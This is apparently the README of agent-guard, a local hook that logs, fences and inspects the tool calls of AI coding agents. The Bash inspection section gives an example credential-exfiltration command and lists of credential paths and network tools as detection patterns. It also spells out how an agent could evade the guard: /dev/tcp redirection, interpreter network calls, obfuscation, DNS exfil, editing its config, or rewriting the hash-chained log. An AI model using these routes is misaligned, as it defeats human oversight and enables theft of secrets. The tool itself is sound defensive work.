# agent-guard

**See what your AI coding agent touches, and fence it in.**

`agent-guard` is a [Claude Code](https://claude.com/claude-code) hook that runs
before every tool call. It does three things:

1. **Logs** every read, write, edit, shell command, and web fetch to a local
   audit trail, viewable on a **live dashboard**.
2. **Blocks** the file *tools* (`Read`/`Write`/`Edit` and friends) from reaching
   outside the folders you allow, so a stray agent can't use them to wander into
   `~/.ssh`, your browser profile, or the rest of your disk. Bash is not
   path-fenced; see [Fence scope](#fence-scope).
3. **Inspects** Bash commands for risky operations the path fence can't see:
   credential reads, network egress, destructive ops, and (blocked by default)
   the naive credential-exfiltration pattern.

For a real OS-level fence around a single command, there's also
[`agentguard run`](#sandboxed-run-agentguard-run). The same policy runs behind
other coding agents too, via [adapters](#beyond-claude-code-other-agents).

Pure Python standard library. No dependencies, no telemetry, nothing leaves your
machine.

```bash
pip install sneakoscope   # the CLI is `agentguard` (alias: `sneakoscope`)
agentguard install      # adds the PreToolUse hook to ~/.claude/settings.json
agentguard dashboard    # http://127.0.0.1:8799
```

Open a new Claude Code session and watch it work in real time.

---

## Why

Agentic coding tools can read and write anything the process can. Most of the
time that's fine; occasionally it isn't, and either way you can't *see* it. Cloud
sandboxes solve this by locking the agent in a box, but you lose your local
setup. `agent-guard` is the lightweight local version: a boundary you define, a
log you can audit, and a red banner the moment something steps over the line.

## How it works

Claude Code fires a `PreToolUse` hook before running any tool and passes it the
tool name and arguments as JSON on stdin. agent-guard:

- appends the call to a JSONL audit log (for the dashboard),
  [hash-chained](#tamper-evident-audit-log) so naive later edits are detectable,
- for a fixed set of file tools (`Read`, `Write`, `Edit`, `MultiEdit`,
  `NotebookEdit`, `Grep`, `Glob`), resolves the target path and checks it against
  your allowed roots (see [Fence scope](#fence-scope) for what this does and
  doesn't cover), and
- for `Bash`, inspects the command string (see below).

When it blocks something it also fires a best-effort desktop
[notification](#block-alerts) so you see it the moment it happens.

Exit code `2` blocks the tool and the reason is shown back to the agent; exit `0`
allows it. **It fails open**: any internal error allows the call, so a bug in the
guard can never brick your agent.

## Fence scope

The path fence is deliberately narrow. It helps to know its edges:

- **It covers a fixed set of file tools only:** `Read`, `Write`, `Edit`,
  `MultiEdit`, `NotebookEdit`, `Grep`, and `Glob`. Any other tool, and any file
  tool Claude Code adds or renames later, is not path-fenced until an entry for it
  is added here. Such calls are still logged, just not fenced.
- **Bash is not path-fenced.** A shell command can read or write anywhere the
  process can, and the fence never sees the paths inside it. Bash inspection
  (above) is a best-effort tripwire over the command string, not a substitute for
  the fence. For a real boundary around a shell command, use
  [`agentguard run`](#sandboxed-run-agentguard-run).
- **The config and log sit outside the default roots.** `~/.agentguard/` holds
  the config (and the audit log, unless you moved it) and is not inside the
  default `allowed_roots`. Because Bash is not fenced, a capable agent could edit
  `~/.agentguard/config.json` to widen the roots or turn enforcement off, or
  rewrite the log directly. Put that directory somewhere the agent has no reason
  to touch, and protect it at the OS level where you can (restrictive file
  permissions, or keep the agent's roots well away from it).

The hook is an **advisory tripwire**: it fires before a tool and can refuse it,
but nothing stops a subprocess that already got past it from touching the disk.
When you need an actual boundary rather than a tripwire, reach for
[`agentguard run`](#sandboxed-run-agentguard-run).

## Bash inspection

Path checks only cover the file tools; a shell command can read a secret or pipe
it off the box without naming a path the guard sees. agent-guard parses each
`Bash` command and records findings, biased hard toward **very low false
positives** so it never trips over normal dev work:

- **credential reads**: `~/.ssh`, `~/.aws`, `.env` / `*.env`, `*.pem`, `*.key`,
  `.netrc`, browser `Login Data`, and similar
- **network egress**: `curl` / `wget` / `nc` / `scp` / `rsync` and similar, to a remote host
- **destructive ops**: `rm -rf` / `dd` / `mkfs` on an absolute path outside your roots
- **outside-root access**: `cat` / `cp` / `mv` / `tee` (or a redirect) of an
  absolute path outside your roots

By default these are **flagged** (logged as suspicious, shown on the dashboard)
but still allowed. Only one narrow case is **blocked**: a command that both reads
recognized credential material *and* pipes it to a network tool with a remote
destination in the same line (e.g. `cat ~/.ssh/id_rsa | curl -X POST https://host
-d @-`). A plain `git`, `npm`, or `python` command is never flagged.

Treat that block as a **tripwire for the naive, literal "read a credential file
and hand it to a remote net tool" pattern, not a boundary.** It matches on command
verbs and filename shapes, so it does not catch exfiltration that avoids them: a
bash `/dev/tcp/host/port` redirection, an interpreter making the network call
itself (`python -c ...`, `node -e ...`), a base64-decoded or otherwise obfuscated
command, or DNS-based exfil. It also recognizes only a fixed list of credential
names, so files like `~/.docker/config.json` and `~/.kube/config` are not seen as
credentials and will not trip it. A determined agent can move a secret off the box
without ever matching this rule. The value is catching the careless case and
recording everything for the dashboard, not enforcing a limit.

Two config keys control it (both default `true`):

- **`inspect_bash`**: inspect Bash commands at all.
- **`bash_enforce`**: let a credential-exfil finding actually block (exit 2).
  Set `false` to flag everything and block nothing.

Config is re-read on every call, so edits take effect immediately, no restart.

## Tamper-evident audit log

The audit log is a **keyless SHA-256 hash chain**. Each entry carries the
previous entry's `hash` as `prev_hash`, and its own `hash` is a SHA-256 over the
entry's content plus that `prev_hash`.

```bash
agentguard verify-log        # or: sneakoscope verify-log
```

`verify-log` recomputes the chain from the file and prints `INTACT`, or the exact
line where it first breaks, **exiting non-zero when broken** so you can run it in
CI or a cron check.

**What this actually guarantees.** It is *tamper-evident*, not tamper-proof. The
chain detects accidental or naive after-the-fact changes to the log: editing a
past line, dropping an interior one, inserting one, or reordering them all fail
the recomputation, because a following entry's `prev_hash` or `hash` no longer
matches. That is the honest scope. It catches a careless edit or a corrupted
line, and it proves nothing beyond that.

**What it does not stop.** The chain is keyless, so it has no unforgeable anchor:
`verify-log` recomputes the whole chain from the file itself, which means anyone
who can run code can recompute a fully valid chain over doctored entries and leave
`verify-log` still reporting `INTACT`. That includes the AI agent being audited.
The log lives under `~/.agentguard/`, which is outside the default fenced roots,
and Bash is not path-fenced (see [Fence scope](#fence-scope)), so a capable agent
can rewrite the log and its hashes directly. Truncating the most recent entries (a
tail-drop) is also **not** detected: a validly chained shorter prefix still
verifies. So do not read a passing `verify-log` as proof the log was untouched by
someone who can run code on the machine; read it as "no accidental or naive edit."

Real tamper-*resistance* would need an HMAC (or a signature) keyed by a secret
kept outside the log, so the chain commits to something an editor of the file
cannot reproduce. That is a possible future direction; it is not implemented
today. Entries written before hashing existed have no `hash`; they're treated as a
legacy prefix and skipped, so old logs still verify and still render on the
dashboard.

## Block alerts

When the guard blocks a call (a path outside your roots, or the credential-exfil
case), it fires a native desktop notification so you catch it in the moment, not
later in the log: a PowerShell balloon on Windows, `osascript` on macOS,
`notify-send` on Linux. It's best-effort by design: spawned without waiting and
with every error swallowed, so the notifier can never delay or crash the hook.
Turn it off with `"alerts": false`.

## Configuration

`agentguard install` writes `~/.agentguard/config.json`:

```json
{
  "enforce": true,
  "allowed_roots": [
    "C:\\Users\\you\\Downloads",
    "C:\\Users\\you\\.claude"
  ],
  "log_path": "C:\\Users\\you\\.agentguard\\access-log.jsonl",
  "inspect_bash": true,
  "bash_enforce": true,
  "alerts": true
}
```

- **`allowed_roots`**: folders the agent may read/write. Everything else is
  outside. Add your project directories here.
- **`enforce`**: `true` blocks; set `false` to **log-only** (watch first, fence
  later).
- **`log_path`**: where the audit trail is written.
- **`inspect_bash`** / **`bash_enforce`**: Bash inspection, see
  [above](#bash-inspection).
- **`alerts`**: desktop notification on a block. `true` by default; set `false`
  to stay quiet.

Point somewhere else with `AGENTGUARD_CONFIG=/path/to/config.json`.

## The dashboard

```bash
agentguard dashboard          # default port 8799
agentguard dashboard --port 9000
```

Auto-refreshing local page: tiles (reads / writes / shell / web / outside /
blocked), a filterable activity table (all / outside / blocked), an
activity-over-time timeline, and the top folders being touched. A red banner
appears the instant anything is blocked.

## Sandboxed run (`agentguard run`)

The hook is *advisory*: it sees a tool call and can refuse it, but nothing stops
a subprocess from touching the disk directly. `run` launches a single command
inside a real OS filesystem sandbox that confines reads and writes to your
`allowed_roots`:

```bash
agentguard run -- python train.py      # or: sneakoscope run -- ...
```

Support is per-OS, and honest about it:

| OS | Backend | Notes |
| --- | --- | --- |
| Linux | `bwrap` (bubblewrap), else `firejail` | Roots are bind-mounted read-write; the rest of `$HOME` is not visible. |
| macOS | `sandbox-exec` | A generated seatbelt profile: deny by default, read+write only inside the roots. |
| Windows | none | **No OS-level sandbox.** There is no clean native equivalent, so `run` refuses rather than pretend. Use Docker or WSL2 for a real fence; the hook still gives you advisory protection. |

If no sandbox tool is found on Linux or macOS, `run` prints how to install one
and refuses to run the command unsandboxed.

## Beyond Claude Code: other agents

The policy, the audit log, and the fence don't care which agent asked. Only the
*wire format* does: how a given agent hands you a pending tool call, and how it
expects a "no" back. agent-guard splits that seam with **adapters**.

An adapter does two small things: parse the agent's pre-tool-call event into one
normalized shape, and emit the verdict the way that agent expects. Everything in
between (allowed roots, Bash inspection, the hash-chained log, the desktop alert)
is shared. Pick one with `--agent`:

```bash
agentguard hook --agent gemini-cli
```

The default is `claude-code`, so the existing hook keeps working with no change.

| Agent | How it integrates | Can it block? |
| --- | --- | --- |
| **claude-code** | `PreToolUse` hook: `{tool_name, tool_input, cwd}` on stdin, **exit 2** blocks, stderr is the reason. | Yes |
| **gemini-cli** | [`BeforeTool` hook](https://github.com/google-gemini/gemini-cli/blob/main/docs/hooks/reference.md): same stdin shape and same exit-2 + stderr contract as Claude Code, different tool names. | Yes |
| **cursor** | [`beforeShellExecution` / `beforeReadFile` hooks](https://cursor.com/docs/hooks): the verdict goes back as `{"permission":"deny"}` JSON on **stdout** (exit 2 is a documented fallback). | Yes |
| **generic** | Pipe the normalized schema below. **exit 2** blocks. Any agent or wrapper that can shell out can use it. | Yes |

**These hooks are advisory.** They fire *before* the tool and can refuse it, but
nothing in the agent stops a subprocess that already got past the prompt from
touching the disk directly. Cursor [fails open](https://cursor.com/docs/hooks) if
the hook crashes, and opencode's plugin hooks
[don't even see subagent tool calls](https://github.com/anomalyco/opencode/issues/5894).
Treat the hook as the tripwire and the log; when you need an actual fence, run the
risky command under [`agentguard run`](#sandboxed-run-agentguard-run), which is
the one enforcement path that doesn't depend on the agent cooperating.

### The generic schema

`--agent generic` reads this JSON on stdin. Every field is optional; send the
ones that apply.

```json
{ "tool": "run",
  "paths": ["/abs/path/it/will/read/or/write"],
  "command": "the shell command, if any",
  "url": "the fetch target, if any",
  "cwd": "/working/dir" }
```

`paths` are checked against your allowed roots; `command` goes through Bash
inspection; `url` is recorded. Exit `2` means block (reason on stderr), `0`
allows. So a one-line wrapper is enough to put any agent behind agent-guard, for
example an [opencode](https://opencode.ai/docs/plugins/) `tool.execute.before`
plugin that pipes `{tool, command, paths}` to `agentguard hook --agent generic`
and throws when it exits non-zero.

### Agents without a usable blocking hook

Not every tool exposes a pre-tool hook that can *stop* a call, and this section
stays honest about that rather than shipping a fake adapter:

- **Codex CLI**: its `notify` hook is a doorbell that fires *after* the fact and
  [cannot block](https://backgrind.com/blog/codex-cli-notifications/); synchronous
  `PreToolUse`-style blocking is still
  [an emerging proposal](https://github.com/openai/codex/issues/14882).
- **opencode**: hooks are in-process TypeScript plugins, not an external command;
  integrate with the `generic` adapter from a `tool.execute.before` plugin.
- **Cline, aider**: no external pre-tool hook that vetoes a call.

For all of these, use the `generic` adapter where you can pipe an event, and
`agentguard run` as the universal fallback fence. (Citations above are what these
tools' own docs say; if an agent ships a real blocking hook later, it's a small
adapter to add.)

### Adding an adapter

An adapter is a small class in `agentguard/adapters.py`. If the agent's hook reads
a tool event on stdin and blocks with exit 2, subclass `_StdinExitAdapter` and set
its tool vocabulary (which tool names are file ops, where the path / command / url
live): that's the whole `gemini-cli` adapter. If it speaks a different protocol
(like Cursor's stdout verdict), give it its own `parse` and `emit`. Then add it to
the registry. The shared `core.decide` is what every adapter calls, so a new agent
inherits the exact same policy the Claude Code hook enforces.

## Commands

| Command | What it does |
| --- | --- |
| `agentguard install` | Add the PreToolUse hook to `~/.claude/settings.json` (merges, keeps your other hooks). |
| `agentguard uninstall` | Remove it again. |
| `agentguard run -- <cmd>` | Run a command inside an OS filesystem sandbox (Linux/macOS; see above). |
| `agentguard dashboard` | Serve the live dashboard. |
| `agentguard verify-log` | Recompute the audit log's hash chain; report tampering and exit non-zero if broken. |
| `agentguard status` | Print config, whether the hook is installed, and recent counts. |
| `agentguard harden` | Show credential read-deny rules to add to Claude Code's own permissions (dry-run; `--apply` to write). |
| `agentguard hook [--agent NAME]` | The guard itself: what the agent invokes on each tool call. `--agent` selects the wire format (default `claude-code`; see [Beyond Claude Code](#beyond-claude-code-other-agents)). You won't run this by hand. |

### `harden`

The folder fence stops access *outside* your roots. `harden` adds a second layer
using Claude Code's native `permissions.deny`: it keeps tools away from
credential files (`.ssh`, `.aws`, `.env`, `*.pem`, browser login data, and similar)
wherever they live. It's a dry-run by default:

```bash
agentguard harden          # print what it would add
agentguard harden --apply  # write the rules to settings.json
```

## Manual install (without pip)

The repo works as-is. Clone it and point a `PreToolUse` hook at the shim:

```json
{
  "hooks": {
    "PreToolUse": [
      { "hooks": [{ "type": "command", "command": "python",
                    "args": ["/path/to/agent-guard/guard.py"], "timeout": 10 }] }
    ]
  }
}
```

Then `python dashboard.py` for the dashboard.

## License

MIT.
